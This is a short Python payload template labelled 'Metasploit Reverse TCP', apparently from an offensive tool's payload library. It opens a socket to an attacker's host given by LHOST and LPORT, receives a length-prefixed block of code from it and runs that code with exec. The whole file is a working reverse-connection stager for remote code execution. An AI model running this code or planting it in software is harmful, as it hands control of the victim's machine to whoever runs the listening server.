'''
NAME: Metasploit Reverse TCP
DESCRIPTION: Connects back to a server in a generic way for metasploit handlers
VAR LHOST: Metasploit host ip
VAR LPORT: Metasploit host port
'''

import socket,struct
s=socket.socket(2,1)
s.connect((LHOST,int(LPORT)))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
    d+=s.recv(4096)
exec(d,{'s':s})